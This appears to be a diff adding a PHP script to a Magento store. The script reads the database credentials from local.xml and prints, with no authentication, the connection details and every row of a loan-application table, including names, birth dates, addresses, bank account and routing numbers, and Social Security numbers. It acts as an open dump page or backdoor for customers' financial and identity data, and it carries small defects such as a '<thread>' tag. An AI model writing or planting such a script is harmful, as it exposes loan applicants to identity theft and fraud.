@@ -1,0 +1,131 @@
+<?php
+ 
+// Parse magento's local.xml to get db info, if local.xml is found
+ 
+if (file_exists('./../../../../../../app/etc/local.xml')) {
+ 
+$xml = simplexml_load_file('./../../../../../../app/etc/local.xml');
+ 
+$tblprefix = $xml->global->resources->db->table_prefix;
+$dbhost = $xml->global->resources->default_setup->connection->host;
+$dbuser = $xml->global->resources->default_setup->connection->username;
+$dbpass = $xml->global->resources->default_setup->connection->password;
+$dbname = $xml->global->resources->default_setup->connection->dbname;
+ 
+}
+ 
+else {
+    exit('Failed to open app/etc/local.xml');
+}
+ 
+// DB Interaction
+$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to <a class="HelpLink" onclick="showHelpTip(event, hint_id_7); return false;" href="javascript:void(0)">mysql</a>');
+mysql_select_db($dbname);
+ 
+$result = mysql_query("SELECT * FROM " . $tblprefix . "clx_loan_application_detail") or die (mysql_error());
+ 
+ 
+// CSS for NexStyle
+echo '
+<html>
+<head>
+</head>';
+ 
+echo '
+<body>
+<b>Table Prefix:</b> ' . $tblprefix . ''
+. '<b>DB Host:</b> ' . $dbhost . ''
+. '<b>DB User:</b> ' . $dbuser . ''
+. '<b>DB Name</b>: ' . $dbname . '</p>';
+ 
+echo '
+        <table border="1">
+        <thread>
+        <tr>
+        <th>clx_loan_application_detail_id</th>
+           <th>order_id</th>
+           <th>application_id</th>
+           <th>quote_id</th>
+           <th>approvalRequired_flag</th>
+	   <th>mail_sent</th>	
+	   <th>offer_mail_sent_time</th>
+	   <th>prev_offer_mail_sent_time</th>
+           <th>status</th>
+           <th>created_time</th>
+           <th>update_time</th>
+           <th>firstName</th>
+           <th>lastName</th>
+           <th>emailId</th>
+           <th>birthDate</th>
+           <th>mobilePhoneAreaCode</th>
+           <th>mobileNumber</th>
+           <th>street</th>
+           <th>city</th>
+           <th>state</th>
+           <th>zipcode</th>
+           <th>country</th>
+           <th>yearlyIncome</th>
+           <th>employmentStatus</th>
+           <th>employmentName</th>
+           <th>loanTerms</th>
+           <th>employmentStartDate</th>
+           <th>occupation</th>
+           <th>bankName</th>
+           <th>firstAccountHolderName</th>
+           <th>bankAccountType</th>
+           <th>bankAccountNumber</th>
+           <th>routingNumber</th>
+           <th>loanAmount</th>
+           <th>loanPurpose</th>
+           <th>ssn</th>
+           <th>selfReportedCreditScore</th>
+           </tr>
+           </thread>
+           <tbody>';
+ 
+while ($row = mysql_fetch_array($result)) {
+           echo "<tr>";
+           echo "<td>" . $row['clx_loan_application_detail_id'] . "</td>";
+           echo "<td>" . $row['order_id'] . "</td>";
+           echo "<td>" . $row['application_id'] . "</td>";
+           echo "<td>" . $row['quote_id'] . "</td>";
+           echo "<td>" . $row['approvalRequired_flag'] . "</td>";
+           echo "<td>" . $row['mail_sent'] . "</td>";
+           echo "<td>" . $row['offer_mail_sent_time'] . "</td>";
+           echo "<td>" . $row['prev_offer_mail_sent_time'] . "</td>";
+           echo "<td>" . $row['status'] . "</td>";
+           echo "<td>" . $row['created_time'] . "</td>";
+           echo "<td>" . $row['update_time'] . "</td>";
+           echo "<td>" . $row['firstName'] . "</td>";
+           echo "<td>" . $row['lastName'] . "</td>";
+           echo "<td>" . $row['emailId'] . "</td>";
+           echo "<td>" . $row['birthDate'] . "</td>";
+           echo "<td>" . $row['mobilePhoneAreaCode'] . "</td>";
+           echo "<td>" . $row['mobileNumber'] . "</td>";
+           echo "<td>" . $row['street'] . "</td>";
+           echo "<td>" . $row['city'] . "</td>";
+           echo "<td>" . $row['state'] . "</td>";
+           echo "<td>" . $row['zipcode'] . "</td>";
+           echo "<td>" . $row['country'] . "</td>";
+           echo "<td>" . $row['yearlyIncome'] . "</td>";
+           echo "<td>" . $row['employmentStatus'] . "</td>";
+           echo "<td>" . $row['employmentName'] . "</td>";
+           echo "<td>" . $row['loanTerms'] . "</td>";
+           echo "<td>" . $row['employmentStartDate'] . "</td>";
+           echo "<td>" . $row['occupation'] . "</td>";
+           echo "<td>" . $row['bankName'] . "</td>";
+           echo "<td>" . $row['firstAccountHolderName'] . "</td>";
+           echo "<td>" . $row['bankAccountType'] . "</td>";
+           echo "<td>" . $row['bankAccountNumber'] . "</td>";
+           echo "<td>" . $row['routingNumber'] . "</td>";
+           echo "<td>" . $row['loanAmount'] . "</td>";
+           echo "<td>" . $row['loanPurpose'] . "</td>";
+           echo "<td>" . $row['ssn'] . "</td>";
+           echo "<td>" . $row['selfReportedCreditScore'] . "</td>";
+           echo "</tr>";
+}
+ 
+echo "</tbody></table></body></html>";
+ 
+mysql_close($conn);
+?>
